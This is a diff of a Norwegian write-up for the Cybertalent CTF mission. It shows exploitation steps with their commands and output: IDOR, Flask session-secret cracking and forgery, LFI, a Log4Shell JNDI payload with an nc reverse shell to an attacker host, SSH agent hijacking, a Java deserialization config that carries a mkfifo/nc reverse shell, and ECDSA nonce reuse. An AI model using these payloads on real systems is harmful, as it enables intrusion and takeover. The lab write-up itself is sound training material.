@@ -5,15 +5,16 @@ Cybertalent er en årlig CTF holdt av Etteretningstjenesten. Den varer normalt i
 2. Oppdrag
 3. Utfordringer
 
-Denne writeup'en tar for seg oppdraget. Konteksten rundt oppdraget vil du finne [her](kontekst).
+Denne writeup'en tar for seg oppdraget. Konteksten rundt oppdraget vil du finne [her](context).
 
 ---
 
 ## 2_01 - pcap_fil
 
-Når vi åpner PCAP-filen i Wireshark er det en HTTP pakke som skiller seg ut:
+Vi har mottatt ei [PCAP-fil](context/COMPROMISE_PWR-WS-CAF5DB.pcap) med nettverkstraffik fra angrepet.
+Når vi åpner den i Wireshark er det en HTTP pakke som skiller seg ut:
 
-```text
+```bash
 GET / HTTP/1.1
 Host: pwr-07-ws-caf5db
 Accept: */*
@@ -36,10 +37,24 @@ Gratulerer, korrekt svar!
 
 ## 2.02_anvilnotes
 
-INTREP gir oss en pekepinne mot en nettside som kan nås på ANVILNOTES.CYBERTALENT.NO.
-Dette er tilsynelatende en helt vanlig nettside hvor man kan lage bruker, logge inn og lagre notater i skyen.
+[INTREP](context/INTREP.txt) gir oss en pekepinne mot en nettside som kan nås på ANVILNOTES.CYBERTALENT.NO.
+Dette fremstår som en helt vanlig nettside hvor man kan lage bruker, logge inn og lagre notater i skyen.
 
-Om vi lager en testbruker og lager et notat, så kan vi se at hvert notat får en mangesifret unik ID. Vi kan logge ut og fortsatt kunne lese notatet så lenge vi har ID'en. Utifra dette begynte jeg å se etter "Insecure direct object references" (IDOR), og kom frem til at https://anvilnotes.cybertalent.no/note/1 gir oss tilgang til et notat skrevet av admin. Dette notatet innholder et flagg, og hint om veien videre.
+Om vi lager en testbruker og lager et notat, så kan vi se at hvert notat får en mangesifret unik ID. 
+Utifra dette begynte jeg å se etter *Insecure Direct Object References* (IDOR), og kom frem til at https://anvilnotes.cybertalent.no/note/1 gir oss tilgang til et notat skrevet av admin. 
+Dette notatet innholder et flagg, og mulige hint om veien videre:
+
+```text
+FLAGG: 4aee8b5ccff539d35e7c8d6a1d749e1b
+
+Development status:
+☑ Figure out a way to generate PDFs securely!
+☑ Make IT department fix firewall rules for the internal API
+☑ Randomize note ids to prevent enumeration
+☐ VIM keybindings
+☐ Secure flask token using military grade encryptions that can't be unsigned using open software.
+☐ Enable PDF feature for all users
+```
 
 ```text
 Kategori: 2. Oppdrag
@@ -63,25 +78,25 @@ Da fikk jeg opp denne som fjerdevalg: https://github.com/Paradoxis/Flask-Unsign
 
 Bruken av verktøyet er ganske rett frem, og hvordan/hvorfor det funker står best forklart på GitHub'en.
 
-```
+```bash
 pip3 install flask-unsign[wordlist]
 flask-unsign --unsign --cookie "eyJ1c2VybmFtZSI6ImEifQ.Y7HYAw.1tPvb-GFYM6W4EWgbaJELRAZy7k"
-[*] Session decodes to: {'username': 'a'}
-[*] No wordlist selected, falling back to default wordlist..
-[*] Starting brute-forcer with 8 threads..
-[*] Attempted (2176): -----BEGIN PRIVATE KEY-----.m2
-[*] Attempted (2560): /-W%/egister your app with Twi
-[*] Attempted (4224): 5#y2LF4Q8z8a52f30af11409c74288
-[*] Attempted (31104): -----BEGIN PRIVATE KEY-----S_K
-[+] Found secret key after 35712 attemptsYRjlMjM1k45F
-'This is an UNSECURE Secret. CHANGE THIS for production environments.'
+# [*] Session decodes to: {'username': 'a'}
+# [*] No wordlist selected, falling back to default wordlist..
+# [*] Starting brute-forcer with 8 threads..
+# [*] Attempted (2176): -----BEGIN PRIVATE KEY-----.m2
+# [*] Attempted (2560): /-W%/egister your app with Twi
+# [*] Attempted (4224): 5#y2LF4Q8z8a52f30af11409c74288
+# [*] Attempted (31104): -----BEGIN PRIVATE KEY-----S_K
+# [+] Found secret key after 35712 attemptsYRjlMjM1k45F
+# 'This is an UNSECURE Secret. CHANGE THIS for production environments.'
 ```
 
-Nå som vi har hemmeligheten som ble brukt for å signere JWT så kan vi signere vår egen hvor vi er admin:
+Dette gir oss hemmeligheten som ble brukt for å signere JWT. Vi kan gjenbruke denne for å signere en ny JWT hvor vi er admin:
 
-```
+```bash
 flask-unsign --cookie '{"username": "admin"}' --secret "This is an UNSECURE Secret. CHANGE THIS for production environments." --sign
-eyJ1c2VybmFtZSI6ImFkbWluIn0.Y7HcuQ.fIhMwTA2wkD3L0lphwKfic0mKqA
+# eyJ1c2VybmFtZSI6ImFkbWluIn0.Y7HcuQ.fIhMwTA2wkD3L0lphwKfic0mKqA
 ```
 Vi kan da bytte ut vår JWT med overnevnte og navigere til https://anvilnotes.cybertalent.no/notes for å motta neste flagg.
 
@@ -100,10 +115,11 @@ Som admin har du kanskje tilgang til mer funksjonalitet?
 
 Som admin har vi nå tilgang til "Save as PDF"-funksjonaliteten.
 
-Jeg brukte Burp Suite for å inspisere nettverkstrafikken, og lærte at /genpdf endepunktet mottok en notat-ID via `id`-parameteret, og returnerte en PDF ved å bruke HTML-til-PDF programvaren `Werkzeug/2.2.2`.
-Werkzeug er kjent for å være sårbar for Server Side Template Injection tidligere, men jeg klarte ikke å utnytte dette. Jeg kikket etter Local File Inclusion via `id`-parameteret, og fant ut at `id=../../` avslører et internt API:
+Jeg brukte Burp Suite for å inspisere nettverkstrafikken, og lærte at `/genpdf` endepunktet mottok en notat-ID via `id`-parameteret, og returnerte en PDF ved å bruke HTML-til-PDF programvaren `Werkzeug/2.2.2`.
+Tidligere versjoner av Werkzeug har vært sårbar for *Server Side Template Injection*, men jeg klarte ikke å utnytte dette. 
+Etterhvert kikket jeg etter *Local File Inclusion* via `id`-parameteret, og fant ut at `id=../../` avslører det interne API'et som ble nevnt i [notatet](#202_anvilnotes) til admin:
 
-```xml
+```yaml
 {
     "definitions": {},
     "info": {
@@ -197,12 +213,12 @@ Werkzeug er kjent for å være sårbar for Server Side Template Injection tidlig
 ```
 
 Jeg brukte da Repeater-funksjonaliteten i Burp for å utforske API'et:
-```
->>> id=../users
-["a","admin","Benjamin","Brian","Cynthia","Frank","George","Henry","Jason","Julia","Karen","Laura","Marilyn","Mark","Mary","Olivia","oper","Richard","Russell","Samuel","Sharon","Stephen","Theresa"]
+```bash
+id=../users
+# ["a","admin","Benjamin","Brian","Cynthia","Frank","George","Henry","Jason","Julia","Karen","Laura","Marilyn","Mark","Mary","Olivia","oper","Richard","Russell","Samuel","Sharon","Stephen","Theresa"]
 
->>> id=../user/oper
-{"password":"83105903c96feecb4e2fce49379af0b5f4e140533d2f216d2cc617d210eec4fbebbdcd4a3c6202b1f285420146edc8ed72ce3166e8806cdf2cf3d290630741f598b2d34bac5048","username":"oper"}
+id=../user/oper
+# {"password":"83105903c96feecb4e2fce49379af0b5f4e140533d2f216d2cc617d210eec4fbebbdcd4a3c6202b1f285420146edc8ed72ce3166e8806cdf2cf3d290630741f598b2d34bac5048","username":"oper"}
 ```
 
 Passordet ser ikke ut til å passe noe slags hash-format som jeg er bekjent, og hvis man sammenligner den med de andre brukerne så er lengden varierende.
@@ -210,9 +226,9 @@ Det vil da hinte til at det er kryptert, ikke hashet.
 
 API'et har dekrypteringsfunksjonalitet, så vi kan benytte det i henhold til beskrivelsen som ble gitt:
 
-```
->>> id=../decrypt?data=83105903c96feecb4e2fce49379af0b5f4e140533d2f216d2cc617d210eec4fbebbdcd4a3c6202b1f285420146edc8ed72ce3166e8806cdf2cf3d290630741f598b2d34bac5048
-FLAGG: ed9e224f5a359543420928d1ed1a8ca8
+```bash
+id=../decrypt?data=83105903c96feecb4e2fce49379af0b5f4e140533d2f216d2cc617d210eec4fbebbdcd4a3c6202b1f285420146edc8ed72ce3166e8806cdf2cf3d290630741f598b2d34bac5048
+# FLAGG: ed9e224f5a359543420928d1ed1a8ca8
 ```
 
 Ser ut som om passordet til `oper` er `FLAGG: ed9e224f5a359543420928d1ed1a8ca8`. Det er beleilig.
@@ -232,13 +248,15 @@ Hvis aktøren har benyttet denne tjenesten finner vi kanskje noen interessante n
 
 Hvis vi logger på med brukernavn og passord nevnt ovenfor så finner vi to notater:
 
-```
+```text
 Backup of client source code	
 Backup of server source code
 ```
 
 Flagget ligger i notatene, sammen med den Base-64-kodet kildekoden til C2-klienten/-serveren.
-Disse kommer vi tilbake til for 2.09.
+Jeg brukte [denne](https://gchq.github.io/CyberChef/#recipe=From_Base64('A-Za-z0-9%2B/%3D',true,false)Gunzip()Untar()) oppskriften i Cyberchef for å pakke den ut.
+
+Koden ligger [her](context/c2_source_code/), og den kommer vi tilbake til i [2.09](#209_cloud-hq).
 
 ```text
 Kategori: 2. Oppdrag
@@ -257,9 +275,9 @@ En samarbeidende tjeneste i Pseudova vurderer at dette meget sannsynlig er kilde
 En rask nmap skann av subnettet avslører at serveren med Log4J-sårbarheten fortsatt er tilgjengelig:
 
 ```bash
->>> nmap -sn 10.0.236.101/27
-Nmap scan report for 0e7e17e3605aa2385b923dbd549531e4_pwr-ws-caf5db.1.4gpt2qoq7daix109e09sese50.0e7e17e3605aa2385b923dbd549531e4_backend (10.0.236.102)
-Host is up (0.0076s latency).
+nmap -sn 10.0.236.101/27
+# Nmap scan report for 0e7e17e3605aa2385b923dbd549531e4_pwr-ws-caf5db.1.4gpt2qoq7daix109e09sese50.0e7e17e3605aa2385b923dbd549531e4_backend (10.0.236.102)
+# Host is up (0.0076s latency).
 ```
 
 Da jeg tidligere har utnyttet Log4J så har jeg hatt best erfaring med [dette](https://github.com/zzwlpx/JNDIExploit) Github repositoret. `JNDIExploit.jar`-fila er ikke tilgjengelig der lengre, men kan finnes [her](https://github.com/black9/Log4shell_JNDIExploit).
@@ -267,12 +285,13 @@ Da jeg tidligere har utnyttet Log4J så har jeg hatt best erfaring med [dette](h
 I angrepet vi observerte i pcap-fila var sårbarheten i User-Agent headeren. Utnyttelsen blir derfor slik:
 
 ```bash
-java -jar JNDIExploit-1.2-SNAPSHOT.jar -i 10.0.69.36 &
-nc -lvnp 4444
-curl pwr-ws-caf5db -A '${jndi:ldap://corax:1389/Basic/ReverseShell/10.0.69.36/4444}'
+java -jar JNDIExploit-1.2-SNAPSHOT.jar -i corax &
+nc -lvnp 4444 &
+curl pwr-ws-caf5db -A '${jndi:ldap://corax:1389/Basic/ReverseShell/corax/4444}'
+fg
 ```
 
-Om alt gikk bra vil vi få et shell i terminalen vi kjørte `nc`, og flagget ligger godt synlig.
+Om alt gikk bra vil vi få et shell. Flagget ligger godt synlig i hjemmemappen.
 
 ```text
 Kategori: 2. Oppdrag
@@ -291,18 +310,34 @@ Ny fil: /home/login/2_oppdrag/sshkey_pwr-ws-caf5db
 
 ## 2.07_shady-aggregator
 
-Om vi bruker `ps -aux` for å liste prosessene som kjører ser vi en aktiv SSH forbindelse:
-`user         428  0.0  0.0   9100  1616 ?        Ss    2022   0:00 ssh: /home/user/.ssh/cp/archive@shady-aggregator_`
+Om vi bruker `ps -aux` for å liste prosessene som kjører ser vi en interessant SSH forbindelse:
+```text
+USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
+root           1  0.0  0.0   2236   432 ?        Ss   Jan09   0:00 /sbin/init
+user          10  0.1  0.7 2542548 58716 ?       Sl   Jan09   2:08 /usr/bin/java -Dcom.sun.jndi.ldap.object.trustURLCodebase=true -jar /usr/share/java/api-server.jar
+root          36  0.0  0.0  13348  3088 ?        Ss   Jan09   0:00 sshd: /usr/sbin/sshd [listener] 0 of 10-100 startups
+root         206  0.0  0.0  14712  6440 ?        Ss   Jan09   0:00 sshd: user [priv]
+user         212  0.0  0.0  15032  4356 ?        S    Jan09   0:00 sshd: user@pts/0
+user         213  0.0  0.0 1116108 5320 pts/0    Ssl  Jan09   0:00 -fish
+user         463  0.0  0.0   9100  2232 ?        Ss   Jan09   0:00 ssh: /home/user/.ssh/cp/archive@shady-aggregator_737236436b188023edcd4d77faeb428ba6e6f708 [mux]
+user         566  0.0  0.6 2330464 52872 pts/0   Sl+  Jan09   1:54 java -jar .client
+root       34448  0.2  0.1  14716  8940 ?        Ss   17:05   0:00 sshd: user [priv]
+user       34454  0.0  0.0  15036  6048 ?        S    17:05   0:00 sshd: user@pts/1
+user       34455  0.6  0.0 239508  7784 pts/1    Ssl  17:05   0:00 -fish
+user       34549  0.0  0.0   6988  3104 pts/1    R+   17:05   0:00 ps -aux
+```
 
-```
->>> ls -la /tmp/ssh-njl06sp7u2/agent.203 
-srwxr-xr-x 1 user user 0 Dec 31 22:33 /tmp/ssh-njl06sp7u2/agent.203=
-```
+Brukeren `archive` fra maskinen `shady-aggregator` har en aktiv SSH forbindelse med *Agent Forwarding* til våres bruker. Dette kan vi [utnytte](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/ssh-forward-agent-exploitation):
 
+```bash
+ls -la /tmp/ssh-njl06sp7u2/agent.203 
+# srwxr-xr-x 1 user user 0 Dec 31 22:33 /tmp/ssh-njl06sp7u2/agent.203=
+SSH_AUTH_SOCK=/tmp/ssh-njl06sp7u2/agent.203 ssh archive@shady-aggregator
+whoami
+# archive
+cat FLAGG
+# FLAGG: 8f1e081e605843164b5efc848c12696a
 ```
-SSH_AUTH_SOCK=/tmp/ssh-njl06sp7u2/agent.203 ssh archive@shady-aggregator.utl
-```
-
 
 ```text
 Kategori: 2. Oppdrag
@@ -319,38 +354,65 @@ Det burde være mulig å hoppe videre til de andre enhetene som kontrolleres.
 
 ## 2.08_client_list
 
-`ps -aux` på `pwr-ws-caf5db` forteller oss at det er en aktiv c2 klient på maskinen. I mappen `/tmp/.tmp/` finner vi følgende filer:
+Ref. outputtet fra `ps -aux` på [2.07](#207_shady-aggregator) så ser at det er en klient kjørende på maskinen: `java -jar .client` 
 
-```text
--rw-r--r-- 1 user user 11258 Dec 18 22:02 .client
--rw-r--r-- 1 user user   202 Jan  1 22:43 .config
--rw-r--r-- 1 user user    22 Jan  1 22:43 .output
+```bash
+find / -name ".client" 2>/dev/null
+# /tmp/.tmp/.client
+ls -la /tmp/.tmp/
+# -rw-r--r-- 1 user user 11258 Dec 18 22:02 .client
+# -rw-r--r-- 1 user user   202 Jan  1 22:43 .config
+# -rw-r--r-- 1 user user    22 Jan  1 22:43 .output
+strings /tmp/.tmp/.config 
+# utils.Config$0
+# sleepDurationL
+# Ljava/lang/String;L
+# pendingCommandst
+# Ljava/util/ArrayList;L
+#         serverURLq
+# xpwA
+# 42FD29AED93B779C
+# %http://shady-aggregator.utl/f52e6101/
 ```
 
-Om vi kjører `strings /tmp/.tmp/.config` får vi en suspekt URL:
-`http://shady-aggregator.utl/f52e6101/`
+Den URL'en ser veldig suspekt ut. En rask rekognosering med `gobuster` gir oss dette:
 
+```bash
+gobuster dir -u http://shady-aggregator.utl/f52e6101/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+# ===============================================================
+# Gobuster v3.4
+# by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+# ===============================================================
+# [+] Url:                     http://shady-aggregator.utl/f52e6101/
+# [+] Method:                  GET
+# [+] Threads:                 10
+# [+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+# [+] Negative Status codes:   404
+# [+] User Agent:              gobuster/3.4
+# [+] Timeout:                 10s
+# ===============================================================
+# 2023/01/01 13:37:00 Starting gobuster in directory enumeration mode
+# ===============================================================
+# /list               (Status: 200) [Size: 1029] 
 
-En rask rekognosering med kommandoen `gobuster dir -h http://shady-aggregator.utl/f52e6101/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt` sier oss at `/list` er en gyldig sti:
-
-```
 curl http://shady-aggregator.utl/f52e6101/list
-
-ID               | NAME                             | LAST CHECKIN
------------------+----------------------------------+--------------------
-42FD29AED93B779C | pwr-ws-caf5db                    | 2023-01-01 23:45:02
-DEADBEEFDEADBEEF | test-3                           | 2023-01-01 23:45:01
-18F53CE5F533ACF7 | aurum                            | 2023-01-01 23:44:37
-FLAGG            | 260c54fac22eb752739f2978fff9e021 | 2022-11-30 17:48:21
-6ED230A80172B12E | pwr-ws-72fed1                    | 2022-11-16 11:00:32
-F7D79C0F8995E423 | pwr-ws-64ca70                    | 2022-11-07 09:07:29
-58A5FCF9FB1712B7 | pwr-ws-6d5602                    | 2022-06-30 01:47:58
-93B58D54A5DB772A | pwr-ws-b5747c                    | 2022-06-11 17:25:14
-CAFEBABECAFEBABE | test-2                           | 2022-02-23 08:06:40
-46E894E2BEC4BD46 | pwr-ws-a8a1ce                    | 2022-02-06 22:53:02
-14B6A84F08AC6887 | pwr-ws-e3fb32                    | 2022-01-27 17:24:04
-DEADC0DEDEADC0DE | test-1                           | 2021-12-20 12:33:20
+# ID               | NAME                             | LAST CHECKIN
+# -----------------+----------------------------------+--------------------
+# 42FD29AED93B779C | pwr-ws-caf5db                    | 2023-01-01 23:45:02
+# DEADBEEFDEADBEEF | test-3                           | 2023-01-01 23:45:01
+# 18F53CE5F533ACF7 | aurum                            | 2023-01-01 23:44:37
+# FLAGG            | 260c54fac22eb752739f2978fff9e021 | 2022-11-30 17:48:21
+# 6ED230A80172B12E | pwr-ws-72fed1                    | 2022-11-16 11:00:32
+# F7D79C0F8995E423 | pwr-ws-64ca70                    | 2022-11-07 09:07:29
+# 58A5FCF9FB1712B7 | pwr-ws-6d5602                    | 2022-06-30 01:47:58
+# 93B58D54A5DB772A | pwr-ws-b5747c                    | 2022-06-11 17:25:14
+# CAFEBABECAFEBABE | test-2                           | 2022-02-23 08:06:40
+# 46E894E2BEC4BD46 | pwr-ws-a8a1ce                    | 2022-02-06 22:53:02
+# 14B6A84F08AC6887 | pwr-ws-e3fb32                    | 2022-01-27 17:24:04
+# DEADC0DEDEADC0DE | test-1                           | 2021-12-20 12:33:20
 ```
+
+Legg merke til at `pwr-ws-caf5db`. `test-3` og `aurum` nylig har sjekket inn.
 
 ```text
 Kategori: 2. Oppdrag
@@ -367,7 +429,7 @@ Den test-instansen som fortsatt sjekker inn så spennende ut...
 
 ## 2.09_cloud-hq
 
-Nå har vi tilgang til både archive@shady-aggregator og kildekoden for skadevaren som er i bruk. Scoreboard-teksten til 2.08 hinter mot den test-3 instansen som sjekker inn hvert 10. sekund.
+Nå har vi tilgang til både `archive@shady-aggregator` og kildekoden for skadevaren som er i bruk. Scoreboard-teksten til 2.08 hinter mot den `test-3` instansen som sjekker inn hvert 10. sekund.
 
 Det mest logiske er at det er en sårbarhet i skadevaren som vil gi oss tilgang til de som opererer skadevaren.
 Dette fant jeg ikke med det første, så gravde meg ned i et kaninhull som endte med at jeg fikk tilgang til c2-brukeren på shady-aggregator, som var et flagg i umulig-kategorien. Det var gjennom en race condition -> SSTI, og gjennomgangen ligger [nederst](#3413_shady-aggregator_c2).
@@ -377,7 +439,7 @@ Men selv tilgang til brukeren som kjørte serveren var ikke det som måtte til f
 Etter mye leting på nettet kom jeg over en sårbarhetskategori som heter Java Deserialization. Etter mange timers lesing gjennom slides og whitepapers på [denne](https://github.com/GrrrDog/Java-Deserialization-Cheat-Sheet#overview) GitHub'en så forstod jeg litt hvordan sårbarheten fungerte, og hvordan den kunne anvendes i denne situasjonen.
 
 I Config.java er det en `readObject()` funksjon som håndterer hvordan et Config-objekt skal leses inn.
-I denne ser vi at den går gjennom alle `pendingCommands`, og kjører de hvis tiden er inne. Dette skjer da altså før noe som helst verifikasjon gjennom ECDSA.
+I denne ser vi at den går gjennom alle `pendingCommands`, og kjører de hvis tiden er inne. Dette skjer da altså uten noe som helst verifikasjon gjennom ECDSA.
 
 ```java
 private void readObject(ObjectInputStream ois) throws IOException, ClassNotFoundException {
@@ -407,8 +469,60 @@ Command c = (Command) in.readObject();
 Selv om det mottatte objektet blir kastet til et `Command` object, så vil `readObject()` bli eksekvert før dette.
 Det spiller da ingen rolle om denne kastingen feiler, vi bryr oss bare om hva som skjer i `readObject()`.
 
+For å lage det ondsinnede Config-objektet så modifiserte jeg `Client.java` fra kildekoden:
 
+```java
+public static void make_config() {
 
+    Command maliciousCommand = new commands.Execute();
+    maliciousCommand.recipient = "DEADBEEFDEADBEEF";
+    maliciousCommand.runAfter = Instant.now();
+    maliciousCommand.value = "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc corax 4444 >/tmp/f";
+
+    Config maliciousConfig = new Config();
+    maliciousConfig.id = "DEADBEEFDEADBEEF";
+    maliciousConfig.serverURL = "http://vg.no";
+    maliciousConfig.sleepDuration = 69;
+    maliciousConfig.pendingCommands.add(maliciousCommand);
+
+    try {
+        FileOutputStream fos = new FileOutputStream("malicious_config");
+        ObjectOutputStream oos = new ObjectOutputStream(fos);
+        oos.writeObject(maliciousConfig);
+        oos.close();
+        fos.close();
+    } catch (IOException e) {
+        e.printStackTrace();
+    }
+}
+
+public static void main(String[] args) {
+
+    make_config();
+    System.exit(0);
+}
+```
+
+Dette gir oss `malicious_config`, som vi skal bruke videre.
+Gjorde et par endringer til mens jeg lekte meg. Disse påvirker ikke oppdraget, men du finner de [her](c2_scripts/modified_client_source).
+
+Neste steg var å legge til objektet i kommando-databasen til c2-serveren, slik at `test-3` klienten hentet det under neste innsjekk. Heldigvis hadde jeg direkte tilgang til sqlite3 databasen gjennom `c2` brukeren, så denne problemstillingen slapp jeg å tenke på. :innocent: Lagde et [skript](c2_scripts/add_command_to_db.py) for å gjøre dette.
+
+```bash
+nc -lvnp 4444 &
+scp -i 2_oppdrag/sshkey_c2@shady-aggregator malicious_config c2@shady-aggregator:
+ssh -i 2_oppdrag/sshkey_c2@shady-aggregator c2@shady-aggregator
+cd app
+python3 add_command_to_db.py DEADBEEFDEADBEEF 1 ../malicious_config
+exit
+fg
+whoami
+# oper
+uname -a
+# Linux cloud-hq-79 5.4.0-1094-azure #100~18.04.1-Ubuntu SMP Mon Oct 17 11:44:30 UTC 2022 x86_64 GNU/Linux
+cat /home/oper/FLAGG
+# FLAGG: 80e125e2403402c9486c94eb3b276482
+```
 
 ```text
 Kategori: 2. Oppdrag
@@ -427,7 +541,11 @@ Ny fil: /home/login/2_oppdrag/sshkey_cloud-hq
 
 ## 2.10_infrastruktur
 
-På `cloud-hq-79` finner vi kildekoden til skadevaren. Blant denne ligger det en fil kalt `GenCommand.java`. Denne inneholder koden og privatnøkkelen man trenger for å lage kommandoer, og et flagg.
+På `cloud-hq-79` finner vi den komplette kildekoden til skadevaren i `/home/oper/src`. Blant denne ligger det en fil kalt `GenCommand.java`. Dette er koden som ble brukt for å generere kommandoer, og inni den ligger det et vakkert flagg:
+
+```java
+static String FLAG = "c4381f44298bb0dede6c185dc2406a40";
+```
 
 ```text
 Kategori: 2. Oppdrag
@@ -449,7 +567,7 @@ Ny fil: /home/login/2_oppdrag/INTREP-2.txt
 ## 2.11_aurum_shell
 
 Vi bruker samme utnyttelse som for 2.09, men bytter ut ID'en til aurum sin.
-Flagget ligger godt synlig i `/home/user/FLAG`.
+Flagget ligger godt synlig i hjemmemappen.
 
 ```text
 Kategori: 2. Oppdrag
@@ -612,6 +730,20 @@ Ny fil: /home/login/2_oppdrag/worst_case_scenario.jpg
 
 Jeg reverse engineeret `/usr/bin/konekt`, og fant ut at den fungerte som en wrapper for en tjeneste som kjørte på serveren `mad`, port 1337.
 
+`konekt` tillater oss å laste ned firmware som ligger på serveren. Dette er filene som ligger der fra før:
+
+```text
+╒══════════════════════════════════════════════════════════════════════════════╕
+│                                                                         list │
+╞══════════════════════════════════════════════════════════════════════════════╡
+│ filename                                                            |   size │
+│ --------------------------------------------------------------------+------- │
+│ missile.1.3.37.fw                                                   | 160964 │
+│ server-software.tar.xz                                              |1209804 │
+└──────────────────────────────────────────────────────────────────────────────┘
+```
+
+
 
 I funksjonen `ui_read_key()` finner vi følgende:
 
@@ -629,9 +761,9 @@ Deretter utfører den en bitvis venstre skyving på `_history.0` før den ORer d
 Lettere sagt: de siste 8 bokstavene vi har skrevet inn er lagret i `_history.0`.
 
 `0x726f6f646b636162` er hex for `roodkcab`, som er backdoor baklengs.
-Når `_history` inneholder den verdien, så blir privilegiet vår forhøyet til `Developer`.
+Når `_history.0` inneholder den verdien, så blir privilegiet vår forhøyet til `Developer`.
 
-Nå som vi er `Developer` har vi tilgang til å rename brukeren vår. Grunnet feil i programvare (som vil ta litt for mye tid å forklare), så får vi `SYSTEM` privilegier om vi kaller oss `!`.
+Nå som vi er `Developer` har vi tilgang til å rename brukeren vår. Grunnet feil i programvare (som vil ta litt for mye tid å forklare), så får vi `SYSTEM` privilegier om vi kaller oss noe som ikke er alfanumerisk. Jeg brukte "!".
 
 Vi er nå priviligert nok til å kjøre programmer, og når vi kjører `findflag.prg` får vi opp dette flotte bildet:
 
@@ -670,44 +802,42 @@ Herlig! Vi har nå lov til å kjøre programmer. Kan du bruke dette til noe?
 Hjelp-menyen nevner ECDSA, og hinter til at secp256k1-kurven blir benyttet:
 
 ```bash
-user@aurum:~$ signer --help
-Sign a file with ECDSA
-
-Usage: signer [OPTIONS] --file-name <FILE_NAME> --key-file <KEY_FILE>
-
-Options:
-  -f, --file-name <FILE_NAME>    Path to the file to sign
-  -k, --key-file <KEY_FILE>      PEM-file containing the secp256k1 private key
-  -r, --rng-source <RNG_SOURCE>  RNG seed source (one of Clock, Urandom) [default: Urandom]
-  -h, --help                     Print help information
+signer --help
+# Sign a file with ECDSA
+# 
+# Usage: signer [OPTIONS] --file-name <FILE_NAME> --key-file <KEY_FILE>
+# 
+# Options:
+#   -f, --file-name <FILE_NAME>    Path to the file to sign
+#   -k, --key-file <KEY_FILE>      PEM-file containing the secp256k1 private key
+#   -r, --rng-source <RNG_SOURCE>  RNG seed source (one of Clock, Urandom) [default: Urandom]
+#   -h, --help                     Print help information
 ```
 
 Jeg lagde min egen privatnøkkel, signerte to filer med forskjellig innhold, og sammenlignet signaturene:
 
 ```bash
-user@aurum:~$ openssl ecparam -genkey -name secp256k1 -out privkey.pem -param_enc explicit
+openssl ecparam -genkey -name secp256k1 -out privkey.pem -param_enc explicit
+echo -n aaaaaaaaaaaaaaaa > a.txt && signer --file-name a.txt --key-file privkey.pem --rng-source urandom
+# File size: 16 bytes
+# Signature: Signature { r: 17211542253021086784505659283610982505828311641993563606189014132281847868803, s: 101470930953263482905196496644008688681262853128827165933802638504190043123950 }
+echo -n bbbbbbbbbbbbbbbb > b.txt && signer --file-name b.txt --key-file privkey.pem --rng-source urandom
+# File size: 16 bytes
+# Signature: Signature { r: 17211542253021086784505659283610982505828311641993563606189014132281847868803, s: 89169711667094524674132738496910071433093664457918580439307144153630819379727 }
 
-user@aurum:~$ echo -n aaaaaaaaaaaaaaaa > a.txt && signer --file-name a.txt --key-file privkey.pem --rng-source urandom
-File size: 16 bytes
-Signature: Signature { r: 17211542253021086784505659283610982505828311641993563606189014132281847868803, s: 101470930953263482905196496644008688681262853128827165933802638504190043123950 }
+cat a.txt_signed | hd
+# 00000000  61 61 61 61 61 61 61 61  61 61 61 61 61 61 61 61  |aaaaaaaaaaaaaaaa|
+# 00000010  26 0d 63 3f e0 91 a7 ef  24 42 7c d1 96 c6 cd 15  |&.c?....$B|.....|
+# 00000020  f8 19 49 d5 6a 39 3e 23  36 e0 d0 0d 15 fc 6d 83  |..I.j9>#6.....m.|
+# 00000030  e0 56 82 fc 14 07 3f c8  7e db 80 9d 79 af 25 c0  |.V....?.~...y.%.|
+# 00000040  84 7d 1b 1e 3b 49 6b bd  cf 18 69 60 8c 86 70 ee  |.}..;Ik...i`..p.|
 
-user@aurum:~$ echo -n bbbbbbbbbbbbbbbb > b.txt && signer --file-name b.txt --key-file privkey.pem --rng-source urandom
-File size: 16 bytes
-Signature: Signature { r: 17211542253021086784505659283610982505828311641993563606189014132281847868803, s: 89169711667094524674132738496910071433093664457918580439307144153630819379727 }
-
-user@aurum:~$ cat a.txt_signed | hd
-00000000  61 61 61 61 61 61 61 61  61 61 61 61 61 61 61 61  |aaaaaaaaaaaaaaaa|
-00000010  26 0d 63 3f e0 91 a7 ef  24 42 7c d1 96 c6 cd 15  |&.c?....$B|.....|
-00000020  f8 19 49 d5 6a 39 3e 23  36 e0 d0 0d 15 fc 6d 83  |..I.j9>#6.....m.|
-00000030  e0 56 82 fc 14 07 3f c8  7e db 80 9d 79 af 25 c0  |.V....?.~...y.%.|
-00000040  84 7d 1b 1e 3b 49 6b bd  cf 18 69 60 8c 86 70 ee  |.}..;Ik...i`..p.|
-
-user@aurum:~$ cat b.txt_signed | hd
-00000000  62 62 62 62 62 62 62 62  62 62 62 62 62 62 62 62  |bbbbbbbbbbbbbbbb|
-00000010  26 0d 63 3f e0 91 a7 ef  24 42 7c d1 96 c6 cd 15  |&.c?....$B|.....|
-00000020  f8 19 49 d5 6a 39 3e 23  36 e0 d0 0d 15 fc 6d 83  |..I.j9>#6.....m.|
-00000030  c5 24 44 ad b4 c3 94 4c  4e 7e 72 35 cf ee 6c 08  |.$D....LN~r5..l.|
-00000040  95 b3 f6 b3 fe 63 76 00  2a ec 4b ee 1b 5e 6a 0f  |.....cv.*.K..^j.|
+cat b.txt_signed | hd
+# 00000000  62 62 62 62 62 62 62 62  62 62 62 62 62 62 62 62  |bbbbbbbbbbbbbbbb|
+# 00000010  26 0d 63 3f e0 91 a7 ef  24 42 7c d1 96 c6 cd 15  |&.c?....$B|.....|
+# 00000020  f8 19 49 d5 6a 39 3e 23  36 e0 d0 0d 15 fc 6d 83  |..I.j9>#6.....m.|
+# 00000030  c5 24 44 ad b4 c3 94 4c  4e 7e 72 35 cf ee 6c 08  |.$D....LN~r5..l.|
+# 00000040  95 b3 f6 b3 fe 63 76 00  2a ec 4b ee 1b 5e 6a 0f  |.....cv.*.K..^j.|
 ```
 
 `r` har samme verdi over flere signeringer. Dette er veldig dårlig kryptografimessig, men veldig bra for oss. `r = k * G`, hvor `k` er tiltenkt å være en tilfeldig verdi hver gang. Siden den er statisk er det mulig for oss å regne ut privatnøkkelen.
